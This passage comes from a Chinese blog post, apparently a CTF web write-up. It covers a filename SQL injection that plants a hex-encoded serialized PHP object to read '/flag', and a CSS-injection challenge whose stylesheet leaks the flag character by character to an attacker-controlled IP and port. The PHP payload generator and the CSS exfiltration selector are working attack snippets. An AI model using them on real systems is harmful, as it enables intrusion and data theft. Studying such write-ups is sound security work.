+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$array = <span class="keyword">array</span>();</span><br><span class="line">$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br></pre></td></tr></table></figure>
+
+<p>但是我正常去注入的话一直在回显error，其实是五个字段…，从比赛的源码也可以看出泄露的和正在运行的确实是不太一样的</p>
+<p>后来就感觉…注入肯定是没有问题的，就又多加了一个字段，结果成了…</p>
+<p>当时想着注入进去，那肯定直接拿flag了，结果并没有..</p>
+<p>后来才意识到自己的错误，我注入进去的数据是经过url编码的数据</p>
+<p>在平时我们传入url编码的payload是会经过浏览器去处理的，也就是会解码一遍，而这个直接注入进去，burpsuite并不会给文件名自动解码，所以无法反序列化拿到flag,但是这里确实有个protected变量要去处理，结合insert插入16进制编码后的字符串，我们可以直接插入payload的十六进制，这样就可以处理protected变量了</p>
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $ifview = <span class="keyword">True</span>; </span><br><span class="line">	<span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line">	<span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment"># Read some config html</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=<span class="keyword">new</span> helper;</span><br><span class="line"><span class="keyword">echo</span> bin2hex(serialize($c));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://imgse.com/i/Quc6T1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/02/Quc6T1.md.png" alt="Quc6T1.md.png"></a></p>
+<p>访问下show.php触发一下，拿到flag.</p>
+<h3 id="cssgame"><a href="#cssgame" class="headerlink" title="cssgame"></a>cssgame</h3><p>这道题…可能当时没吃饭有点昏，当时简直就是人间迷惑行为…我竟然想去闭合双引号？？？</p>
+<p>link标签</p>
+<p><a href="https://imgse.com/i/Quvx0A" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/02/Quvx0A.md.png" alt="Quvx0A.md.png"></a></p>
+<p>当然这里的href不仅可以引入内部css，还可以去引入外部css，比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xx&#x2F;1.css</span><br></pre></td></tr></table></figure>
+
+<p>可以想到之前Smi1e师傅的css注入文章..那接下来就很简单了…</p>
+<p>vps上写个test.css，内容如下</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"flag"</span>]</span><span class="selector-attr">[value^=<span class="string">"b"</span>]</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"http://139.224.236.99:8967/b"</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目提交<a href="http://vps/test.vss,服务器上监听一下端口" target="_blank" rel="noopener">http://vps/test.vss,服务器上监听一下端口</a></p>
+<p><img src="https://s2.ax1x.com/2019/12/02/Qux5jg.png" alt="Qux5jg.png"></p>
+<p>剩下的字符自动化或者手动探测一下就可以了</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/28/2019D-3CTF-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" rel="next" title="2019D^3CTF 题目复现">
+                <i class="fa fa-chevron-left"></i> 2019D^3CTF 题目复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/12/11/SWPU2019-Web%E9%A2%98%E8%A7%A3/" rel="prev" title="SWPU2019-Web题解">
+                SWPU2019-Web题解 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">离怀秋</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lihuaiqiu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southseast.cc" title="南溟师傅" target="_blank">南溟师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-web"><span class="nav-number">2.</span> <span class="nav-text">easy_web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-serialize-php"><span class="nav-number">3.</span> <span class="nav-text">easy_serialize_php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iamthinking"><span class="nav-number">4.</span> <span class="nav-text">iamthinking</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不是文件上传"><span class="nav-number">5.</span> <span class="nav-text">不是文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cssgame"><span class="nav-number">6.</span> <span class="nav-text">cssgame</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离怀秋</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
